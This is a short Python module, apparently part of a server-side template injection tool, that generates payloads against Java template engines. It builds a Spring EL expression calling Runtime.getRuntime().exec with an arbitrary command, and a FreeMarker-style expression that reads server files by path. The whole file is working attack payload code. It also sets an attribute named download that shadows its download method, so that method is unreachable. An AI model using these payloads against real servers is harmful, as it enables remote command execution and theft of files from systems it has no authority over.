class java:
    def __init__(self):
        self.name = "java"
        self.exec = True
        self.download = True

    def payload_test(self):
        return ["${{347*21}}"]

    def download(self,cmd,index=-1):
        payload = [
        '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("'+cmd+'").toURL().openStream().readAllBytes()?join(" ")}'
        ]
        if index >= 0:
            return payload[index]
        return payload

    def execu(self,cmd,index=-1):
        payload = [
        "${T(java.lang.Runtime).getRuntime().exec('"+cmd+"')}"
        ]
        if index >= 0:
            return payload[index]
        return payload
